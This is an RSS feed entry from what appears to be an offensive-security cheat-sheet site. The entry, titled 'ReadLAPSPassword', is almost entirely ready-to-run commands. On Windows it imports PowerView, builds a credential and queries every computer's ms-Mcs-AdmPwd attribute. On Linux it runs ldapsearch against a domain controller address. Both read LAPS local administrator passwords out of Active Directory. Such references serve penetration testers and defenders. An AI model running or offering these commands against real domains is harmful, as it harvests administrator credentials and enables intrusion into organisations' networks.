channel.title: ReadLAPSPassword on TLDRBins
channel.description: Recent content in ReadLAPSPassword on TLDRBins

item.title: ReadLAPSPassword
item.description: From Windows Import PowerView.ps1 . .\PowerView.ps1 Runas $password = ConvertTo-SecureString "password" -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential("domain\username", $password) Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred From Linux ldapsearch -h 10.10.11.10 -b 'DC=example,DC=com' -x -D username@example.com -w password "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
